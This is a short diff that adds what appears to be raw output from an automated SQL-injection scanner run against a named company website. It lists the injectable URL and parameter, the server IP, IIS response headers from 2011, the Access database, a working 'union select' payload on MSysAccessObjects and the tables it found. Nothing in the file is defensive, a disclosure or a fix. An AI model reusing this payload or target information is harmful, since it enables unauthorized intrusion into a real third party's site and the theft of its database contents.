@@ -1,0 +1,25 @@
+■漏洞信息:============================================================
+ ·URL:http://www.kaidasy.com.cn/NewsInfo.asp?id=149
+ ·页面标题：凯达离心机厂再传捷报
+ ·参数:id=149
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:61.139.126.53
+ ·数据库:Access
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sat, 27 Aug 2011 01:26:58 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 10592
+Content-Type: text/html
+Cache-control: private
+
+
+联合查询列数: 总共= 6  显示的列= 2
+联合查询SQL: and 3=8 union select 1,2,3,4,5,6 from MSysAccessObjects
+找到表:book
+找到表:download
